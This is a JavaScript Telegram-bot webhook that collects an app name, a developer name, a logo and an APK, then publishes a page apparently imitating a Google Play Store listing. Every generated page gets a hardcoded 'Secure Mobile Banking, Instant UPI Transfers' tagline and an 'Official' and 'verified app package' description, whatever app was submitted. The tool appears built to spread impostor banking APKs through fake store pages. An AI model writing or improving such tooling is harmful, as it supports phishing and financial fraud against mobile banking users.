import { head, put, del } from '@vercel/blob';

const token = process.env.TELEGRAM_BOT_TOKEN;
const blobToken = process.env.BLOB_READ_WRITE_TOKEN || process.env.VERCEL_BLOB_READ_WRITE_TOKEN;

async function telegram(method, body) {
	if (!token) {
		console.error('TELEGRAM_BOT_TOKEN is missing');
		return { ok: false, description: 'Token missing' };
	}
	try {
		const result = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
			method: 'POST',
			headers: { 'content-type': 'application/json' },
			body: JSON.stringify(body),
		});
		return await result.json();
	} catch (err) {
		console.error(`Telegram API error (${method}):`, err);
		return { ok: false, error: err.message };
	}
}

async function saveTelegramFile(fileId, path) {
	const file = await telegram('getFile', { file_id: fileId });
	if (!file.ok || !file.result?.file_path) {
		throw new Error(`Telegram file lookup failed: ${file.description || 'Unknown error'}`);
	}
	const download = await fetch(`https://api.telegram.org/file/bot${token}/${file.result.file_path}`);
	if (!download.ok) throw new Error(`Telegram file download failed: ${download.statusText}`);

	const options = { access: 'public', addRandomSuffix: false, allowOverwrite: true };
	if (blobToken) options.token = blobToken;
	const blob = await put(path, await download.arrayBuffer(), options);
	return blob.url;
}

async function loadSession(chatId) {
	try {
		const options = {};
		if (blobToken) options.token = blobToken;
		const record = await head(`sessions/${chatId}.json`, options);
		if (record?.url) {
			const res = await fetch(record.url);
			if (res.ok) return await res.json();
		}
	} catch (err) {
		// Session doesn't exist yet or Blob error
	}
	return { step: 'name', data: {} };
}

async function saveSession(chatId, session) {
	try {
		const options = { access: 'public', addRandomSuffix: false, allowOverwrite: true };
		if (blobToken) options.token = blobToken;
		await put(`sessions/${chatId}.json`, JSON.stringify(session), options);
	} catch (err) {
		console.error('Error saving session to Blob:', err);
	}
}

function slugify(value) {
	return `${value.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '').slice(0, 40)}-${Date.now().toString(36)}`;
}

export default async function handler(request, response) {
	if (request.method !== 'POST') return response.status(405).json({ error: 'POST only' });
	if (!token) {
		console.error('TELEGRAM_BOT_TOKEN environment variable is missing on Vercel');
		return response.status(500).json({ error: 'TELEGRAM_BOT_TOKEN is missing' });
	}

	let update = request.body;
	if (typeof update === 'string') {
		try {
			update = JSON.parse(update);
		} catch {
			update = {};
		}
	}

	const message = update?.message || update?.edited_message;
	if (!message?.chat?.id) {
		return response.status(200).json({ ok: true });
	}

	const chatId = message.chat.id;
	const text = (message.text || '').trim();

	try {
		if (text.startsWith('/start')) {
			await saveSession(chatId, { step: 'name', data: {} });
			await telegram('sendMessage', {
				chat_id: chatId,
				text: '✅ Process started\n\n1/3 App ka naam Bhejiye.',
			});
			return response.status(200).json({ ok: true });
		}

		const session = await loadSession(chatId);

		if (session.step === 'name' && text) {
			session.data.name = text;
			session.step = 'developer';
			await saveSession(chatId, session);
			await telegram('sendMessage', {
				chat_id: chatId,
				text: '✅ 1/3 App name received\n\n2/3 Ab app ka developer / company name Bhejiye.',
			});
		} else if (session.step === 'developer' && text) {
			session.data.developer = text;
			session.step = 'logo';
			await saveSession(chatId, session);
			await telegram('sendMessage', {
				chat_id: chatId,
				text: '✅ 2/3 Developer name received\n\nAb app ka logo / icon image Bhejiye.',
			});
		} else if (session.step === 'logo' && (message.photo?.length || message.document)) {
			const fileId = message.photo ? message.photo[message.photo.length - 1].file_id : message.document.file_id;
			await telegram('sendMessage', { chat_id: chatId, text: '⏳ Uploading logo...' });
			session.data.logoUrl = await saveTelegramFile(fileId, `apps/${chatId}/logo`);
			session.step = 'apk';
			await saveSession(chatId, session);
			await telegram('sendMessage', {
				chat_id: chatId,
				text: '✅ App icon uploaded\n\n3/3 Ab APK document bhejiye (.apk file).',
			});
		} else if (session.step === 'apk' && message.document) {
			const fileName = message.document.file_name || '';
			if (!fileName.toLowerCase().endsWith('.apk')) {
				await telegram('sendMessage', { chat_id: chatId, text: '⚠️ Kripya valid .apk file bhejiye.' });
				return response.status(200).json({ ok: true });
			}

			await telegram('sendMessage', { chat_id: chatId, text: '⏳ Uploading APK & generating Play Store page...' });
			session.data.apkUrl = await saveTelegramFile(message.document.file_id, `apps/${chatId}/base.apk`);
			session.data.slug = slugify(session.data.name || 'app');
			session.data.category = 'APPS';
			session.data.tagline = 'Secure Mobile Banking, Instant UPI Transfers & Financial Services';
			session.data.description = `Official ${session.data.name} app by ${session.data.developer || 'Official'}. Download the verified app package.`;
			session.data.version = '1.0.0';

			const options = { access: 'public', addRandomSuffix: false, allowOverwrite: true };
			if (blobToken) options.token = blobToken;
			await put(`apps/${session.data.slug}.json`, JSON.stringify(session.data), options);

			const host = request.headers.host || 'playstore-web-143.vercel.app';
			const liveUrl = `https://${host}/app/${session.data.slug}`;

			await telegram('sendMessage', {
				chat_id: chatId,
				text: `🎉 Aapka app page ready hai!\n\n🔗 ${liveUrl}`,
			});

			try {
				if (blobToken) options.token = blobToken;
				await del(`sessions/${chatId}.json`, options);
			} catch {}

			return response.status(200).json({ ok: true });
		} else {
			await telegram('sendMessage', {
				chat_id: chatId,
				text: 'ℹ️ Current step ke hisaab se input bhejiye ya /start se dobara shuru karein.',
			});
		}
	} catch (error) {
		console.error('Webhook processing error:', error);
		await telegram('sendMessage', {
			chat_id: chatId,
			text: `⚠️ Error occurred: ${error.message || 'Unknown error'}. Kripya /start se dobara try karein.`,
		});
	}

	return response.status(200).json({ ok: true });
}